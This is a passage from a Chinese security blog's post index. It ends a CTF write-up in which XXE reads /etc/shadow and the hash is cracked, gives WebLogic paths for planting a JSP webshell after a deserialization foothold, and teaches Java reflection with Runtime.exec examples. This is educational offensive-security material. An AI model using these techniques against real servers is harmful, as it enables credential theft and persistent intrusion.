class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n\n<p>在这个文件里可以得知，有一个新的路由<code>/secret-welcome-935734</code>在这里登陆成功后得到flag，用户名为<code>flaguser</code>，密码我们可以用xxe读取<code>/etc/passwd或者/etc/shadow</code>在shadow中我们得知密码为<code>$1$hack$BzqsFHqkPjQ2Sn9amFsgN0</code>这个可以利用<code>hashcat</code>爆破</p>\n<p>关于hashcat的用法<a href=\"https://www.jianshu.com/p/9909ce4c9e7c\"></a></p>\n<p>爆破出来密码是<code>qqz3</code>登录得到flag</p>\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"weblogic上传马路径选择","url":"/2024/04/12/weblogic%E4%B8%8A%E4%BC%A0%E9%A9%AC%E8%B7%AF%E5%BE%84%E9%80%89%E6%8B%A9/","content":"<h1 id=\"weblogic上传木马路径选择\"><a href=\"#weblogic上传木马路径选择\" class=\"headerlink\" title=\"weblogic上传木马路径选择\"></a><a href=\"https://www.cnblogs.com/sstfy/p/10350915.html\">weblogic上传木马路径选择</a></h1><p>对于反序列化漏洞，如果获得的是系统权限或者root权限，那就没必要上传木马，但如果只是web安装应用的权限，就上传获取更大权限。</p>\n<p>上传需要找到几个点，获取物理路径，如下面三种：</p>\n<ul>\n<li><p><strong>方法1：把shell写到控制台images目录中</strong><br><code>\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp</code> 目录上传木马，<br>访问 <code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code><br><a href=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100928075-1843904986.png\"><img src=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100928075-1843904986.png\" alt=\"img\"></a><br><a href=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100936306-699453349.png\"><img src=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100936306-699453349.png\" alt=\"img\"></a></p>\n</li>\n<li><p><strong>方法2：写到uddiexplorer目录中</strong><br><code>\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\随机字符\\war\\shell.jsp</code> 目录写入木马，<br>访问 <code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code><br><a href=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100944582-1944368429.png\"><img src=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100944582-1944368429.png\" alt=\"img\"></a><br><a href=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100951748-1087437211.png\"><img src=\"https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100951748-1087437211.png\" alt=\"img\"></a></p>\n</li>\n<li><p><strong>方法3：在应用安装目录中</strong><br><code>\\Oracle\\Middleware\\user_projects\\domains\\application\\servers\\AdminServer\\tmp\\_WL_user\\项目名\\随机字符\\war\\shell.jsp</code> 目录写入木马，<br>访问 <code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>\n</li>\n</ul>\n","categories":["web"],"tags":["web"]},{"title":"java反射","url":"/2024/05/31/java%E5%8F%8D%E5%B0%84/","content":"<h2 id=\"什么是反射\"><a href=\"#什么是反射\" class=\"headerlink\" title=\"什么是反射\"></a>什么是反射</h2><p>反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。</p>\n<h2 id=\"Java反射组成相关的类\"><a href=\"#Java反射组成相关的类\" class=\"headerlink\" title=\"Java反射组成相关的类\"></a>Java反射组成相关的类</h2><p>java.lang.Class：类对象;</p>\n<p>java.lang.reflect.Constructor：类的构造器对象;</p>\n<p>java.lang.reflect.Field：类的属性对象;</p>\n<p>java.lang.reflect.Method：类的方法对象;</p>\n<h2 id=\"实例化对象的方法\"><a href=\"#实例化对象的方法\" class=\"headerlink\" title=\"实例化对象的方法\"></a>实例化对象的方法</h2><h4 id=\"实例化对象的getClass-方法\"><a href=\"#实例化对象的getClass-方法\" class=\"headerlink\" title=\"实例化对象的getClass()方法\"></a>实例化对象的getClass()方法</h4><p>如果上下⽂中存在某个类的实例 <code>obj</code>，那么我们可以通过 <code>obj.getClass</code> 来获取它的类。</p>\n<h4 id=\"使用类的-class-方法\"><a href=\"#使用类的-class-方法\" class=\"headerlink\" title=\"使用类的 .class 方法\"></a>使用类的 .class 方法</h4><p>如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。</p>\n<h4 id=\"Class-forName-String-className-：动态加载类\"><a href=\"#Class-forName-String-className-：动态加载类\" class=\"headerlink\" title=\"Class.forName(String className)：动态加载类\"></a>Class.forName(String className)：动态加载类</h4><p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取，后续要利用的话是需要实例化的。</p>\n<h2 id=\"获取成员变量Field\"><a href=\"#获取成员变量Field\" class=\"headerlink\" title=\"获取成员变量Field\"></a>获取成员变量Field</h2><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p>\n<p>Field[] getFields() ：获取所有 public 修饰的成员变量</p>\n<p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p>\n<p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p>\n<p>Field getDeclaredField(String name) 获取指定的成员变量</p>\n<h2 id=\"获取成员方法-Method\"><a href=\"#获取成员方法-Method\" class=\"headerlink\" title=\"获取成员方法 Method\"></a>获取成员方法 Method</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Method <span class=\"title function_\">getMethod</span><span class=\"params\">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class=\"comment\">//返回该类所声明的public方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">Method <span class=\"title function_\">getDeclaredMethod</span><span class=\"params\">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class=\"comment\">//返回该类所声明的所有方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">Method[] getMethods() <span class=\"comment\">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">Method[] getDeclaredMethods() <span class=\"comment\">// 获取该类中的所有方法</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"获取构造函数-Constructor\"><a href=\"#获取构造函数-Constructor\" class=\"headerlink\" title=\"获取构造函数 Constructor\"></a>获取构造函数 Constructor</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class=\"keyword\">public</span>构造函数</span><br><span class=\"line\"></span><br><span class=\"line\">Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</span><br><span class=\"line\"></span><br><span class=\"line\">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class=\"keyword\">public</span>构造函数</span><br><span class=\"line\"></span><br><span class=\"line\">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><p>获取 class 实例 之后</p>\n<ul>\n<li>获取类名：<code>forName()</code></li>\n<li>创建对应类型的实例：<code>newInstance()</code></li>\n<li>获取字段的值：<code>get()</code>、设置字段的值：<code>set()</code></li>\n<li>获取方法：<code>getMethod()</code>、调用方法：<code>invoke()</code></li>\n</ul>\n<hr>\n<p>基本知识就是这些，如何执行命令呢，举个例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FinalReflectionCalc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c1</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);<span class=\"comment\">//创建一个runtime的方法</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">c2</span> <span class=\"operator\">=</span> c1.getDeclaredMethod(<span class=\"string\">&quot;getRuntime&quot;</span>);<span class=\"comment\">//获取getRuntime的方法</span></span><br><span class=\"line\">        c2.setAccessible(<span class=\"literal\">true</span>);<span class=\"comment\">//使getRuntime可访问，因为getRuntime是私有属性</span></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">o1</span> <span class=\"operator\">=</span> c2.invoke(<span class=\"literal\">null</span>);<span class=\"comment\">//调用静态方法，无需实例</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m1</span> <span class=\"operator\">=</span> c1.getDeclaredMethod(<span class=\"string\">&quot;exec&quot;</span>,String.class);<span class=\"comment\">//获取exec方法</span></span><br><span class=\"line\">        m1.invoke(o1,<span class=\"string\">&quot;calc&quot;</span>);<span class=\"comment\">//弹计算器</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是调用静态方法，不需要实例</p>\n<p>当然也可以实现一个新实例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FinalReflectionCalc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c1</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>);<span class=\"comment\">//获取Runtime的Class对象</span></span><br><span class=\"line\">        Constructor c2=c1.getDeclaredConstructor();<span class=\"comment\">//获取Runtime类的无参构造函数</span></span><br><span class=\"line\">        c2.setAccessible(<span class=\"literal\">true</span>);<span class=\"comment\">//使getRuntime可访问</span></span><br><span class=\"line\">        Object c3=c2.newInstance();<span class=\"comment\">//创建Runtime的新实例</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">exec</span> <span class=\"operator\">=</span> c1.getDeclaredMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\">        exec.invoke(c3,<span class=\"string\">&quot;calc&quot;</span>);<span class=\"comment\">//弹计算器</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/#0x08-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8\">Java反序列化基础篇-02-Java反射与URLDNS链分析</a>参考链接，写的很清晰</p>\n<p><a href=\"https://www.cnblogs.com/noKing/p/9038234.html#/\">Java反射</a></p>\n<hr>\n<h2 id=\"Java反射修改字段\"><a href=\"#Java反射修改字段\" class=\"headerlink\" title=\"Java反射修改字段\"></a>Java反射修改字段</h2><h3 id=\"private\"><a href=\"#private\" class=\"headerlink\" title=\"private\"></a>private</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PrivateReflect</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;src.PrivatePerson&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> c.newInstance();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">PrintMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;printName&quot;</span>);</span><br><span class=\"line\">        PrintMethod.invoke(m);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">nameField</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        nameField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        nameField.set(m, <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;aaaaa&quot;</span>));</span><br><span class=\"line\">        PrintMethod.invoke(m);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PrivatePerson</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">StringBuilder</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;lll&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">printName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>static单独出现的话，用getDeclaredField也可以</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PrivateReflect</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;src.PrivatePerson&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span>c.newInstance();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;printName&quot;</span>);</span><br><span class=\"line\">        f.invoke(m);</span><br><span class=\"line\">        Field ff=c.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        ff.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        ff.set(m,<span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;lvzhouhang&quot;</span>));</span><br><span class=\"line\">        f.invoke(m);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"final\"><a href=\"#final\" class=\"headerlink\" title=\"final\"></a>final</h2><p>final 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。<strong>直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。</strong></p>\n<h3 id=\"直接赋值\"><a href=\"#直接赋值\" class=\"headerlink\" title=\"直接赋值\"></a>直接赋值</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FinalStraightPerson</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;lvzhouhang&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">age</span> <span class=\"operator\">=</span> <span class=\"number\">21</span>-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">printInfo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(name+<span class=\"string\">&quot; &quot;</span>+age);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FinalStraightReflect</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;src.FinalStraightPerson&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> c.newInstance();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">printMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;printInfo&quot;</span>);</span><br><span class=\"line\">        printMethod.invoke(m);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">nameField</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">ageField</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;age&quot;</span>);</span><br><span class=\"line\">        nameField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        ageField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        nameField.set(m,<span class=\"string\">&quot;lvzhouhang&quot;</span>);</span><br><span class=\"line\">        ageField.set(m,<span class=\"string\">&quot;20&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        printMethod.invoke(m);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样通过反射修改会报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String</span><br><span class=\"line\">\tat sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)</span><br><span class=\"line\">\tat sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)</span><br><span class=\"line\">\tat sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100)</span><br><span class=\"line\">\tat java.lang.reflect.Field.set(Field.java:764)</span><br><span class=\"line\">\tat src.FinalStraightReflect.main(FinalStraightReflect.java:18)</span><br></pre></td></tr></table></figure>\n\n<p>为什么呢？</p>\n<p>因为JVM在编译时期, 就把final类型的String进行了优化, 在编译时期就会把String处理成常量，只要是让name的值经过运行才能获得, 那么就不会被处理为常量。</p>\n<h3 id=\"间接修改\"><a href=\"#间接修改\" class=\"headerlink\" title=\"间接修改\"></a>间接修改</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InDirectReflect</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;src.InDirectPerson&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> c.newInstance();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">printMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;printInfo&quot;</span>);</span><br><span class=\"line\">        printMethod.invoke(m);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">nameField</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">ageField</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;age&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">sexField</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;sex&quot;</span>);</span><br><span class=\"line\">        nameField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        ageField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        sexField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        nameField.set(m,<span class=\"string\">&quot;lvzhouhang&quot;</span>);</span><br><span class=\"line\">        ageField.set(m,<span class=\"number\">200</span>);</span><br><span class=\"line\">        sexField.set(m,<span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;female&quot;</span>));</span><br><span class=\"line\">        printMethod.invoke(m);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InDirectPerson</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">StringBuilder</span> <span class=\"variable\">sex</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;male&quot;</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 经过逻辑判断产生的变量赋值</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">age</span> <span class=\"operator\">=</span> (<span class=\"literal\">null</span>!=<span class=\"literal\">null</span>?<span class=\"number\">20</span>:<span class=\"number\">20</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 通过构造函数进行赋值</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">InDirectPerson</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        name = <span class=\"string\">&quot;lvzhouhang&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">printInfo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(name+<span class=\"string\">&quot; &quot;</span>+age+<span class=\"string\">&quot; &quot;</span>+sex);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样就修改成功了</p>\n<h3 id=\"static-final\"><a href=\"#static-final\" class=\"headerlink\" title=\"static+final\"></a>static+final</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">finalstaticreflection</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">StringBuilder</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;lvzhouhang&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">printName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> src;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">finalstaticflectioncalc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">finalstaticreflection</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">finalstaticreflection</span>();</span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> c.getClass().getDeclaredMethod(<span class=\"string\">&quot;printName&quot;</span>);</span><br><span class=\"line\">        m.invoke(c);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> c.getClass().getField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        f.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        f.set(c,<span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(<span class=\"string\">&quot;lllllvzhouhang&quot;</span>));</span><br><span class=\"line\">        m.invoke(c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span 